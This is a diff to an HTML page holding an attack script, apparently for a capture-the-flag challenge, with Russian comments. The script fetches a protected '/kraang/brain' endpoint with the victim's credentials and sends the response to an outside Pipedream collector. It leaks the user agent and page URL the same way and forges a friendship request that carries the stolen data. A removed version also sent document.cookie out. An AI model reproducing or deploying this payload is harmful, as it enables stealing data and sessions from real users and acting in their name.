@@ -4,29 +4,73 @@
     <script>
         const ENDPOINT = 'https://eoeoea6xkzl1fz8.m.pipedream.net';
         
-        // GET запрос
-        fetch(ENDPOINT + '?step=1&test=123');
+        function log(step, data = '') {
+            // Отправляем каждый лог на Pipedream через Image (надёжнее)
+            const img = new Image();
+            img.src = ENDPOINT + '?step=' + encodeURIComponent(step) + '&info=' + encodeURIComponent(data) + '&time=' + Date. now();
+            console.log(step, data); // Дублируем в консоль для отладки
+        }
         
-        // POST запрос с JSON
-        fetch(ENDPOINT, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON. stringify({
-                flag: 'test_data',
-                cookies: document.cookie
-            })
-        });
+        log('STEP_1', 'Script started');
+        log('INFO_UA', navigator.userAgent);
+        log('INFO_URL', window.location.href);
         
-        // Основная атака
+        log('STEP_2', 'Fetching /kraang/brain');
+        
         fetch('http://158.160.184.159:13002/kraang/brain', {
             credentials: 'include'
         })
-        .then(r => r.text())
+        .then(response => {
+            log('STEP_3', 'Response received, status=' + response.status);
+            
+            if (!response.ok) {
+                log('ERROR_STATUS', 'Response not OK:  ' + response.status);
+                throw new Error('HTTP ' + response.status);
+            }
+            
+            return response.text();
+        })
         .then(data => {
-            // Отправляем флаг на RequestBin
-            fetch(ENDPOINT + '?flag=' + encodeURIComponent(data));
+            log('STEP_4', 'Data received, length=' + data.length);
+            log('DATA_PREVIEW', data.substring(0, 150));
+            
+            // Отправляем полный флаг
+            log('STEP_5', 'Sending full flag to Pipedream');
+            fetch(ENDPOINT + '?FLAG=' + encodeURIComponent(data));
+            
+            // Отправляем friendship request
+            log('STEP_6', 'Sending friendship request');
+            
+            return fetch('http://158.160.184.159:13002/api/friendship/request', {
+                method: 'POST',
+                credentials: 'include',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    to_user: "MrKustic",
+                    message: data
+                })
+            });
+        })
+        .then(response => {
+            log('STEP_7', 'Friendship response status=' + response.status);
+            return response.text();
+        })
+        .then(friendshipResponse => {
+            log('STEP_8', 'Friendship response:  ' + friendshipResponse.substring(0, 100));
+            log('SUCCESS', 'Attack completed successfully!');
+        })
+        .catch(error => {
+            log('ERROR', error.toString());
+            log('ERROR_NAME', error.name);
+            log('ERROR_MSG', error.message);
+            if (error.stack) {
+                log('ERROR_STACK', error.stack. substring(0, 500));
+            }
         });
+        
     </script>
-    <p>Loading...  v14</p>
+    <p>Loading...  v15</p>
 </body>
 </html>
